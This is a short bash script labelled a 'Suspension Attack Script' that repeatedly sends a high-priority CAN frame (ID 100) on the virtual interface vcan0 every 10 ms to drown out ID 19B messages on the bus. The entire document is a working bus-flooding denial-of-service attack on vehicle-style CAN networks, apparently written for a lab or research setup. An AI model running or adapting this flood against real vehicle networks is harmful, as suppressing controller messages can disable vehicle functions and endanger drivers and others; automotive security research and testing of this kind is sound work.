#!/bin/bash
# Suspension Attack Script
# Suppress ID 19B messages by flooding with high-priority messages

echo "Starting Suspension Attack on vcan0..."

# Send a high-priority (low ID) message repeatedly to dominate the bus
while true; do
    cansend vcan0 100#12345678  # High-priority message (ID: 100)
    sleep 0.01                  # Short sleep to flood the bus
done
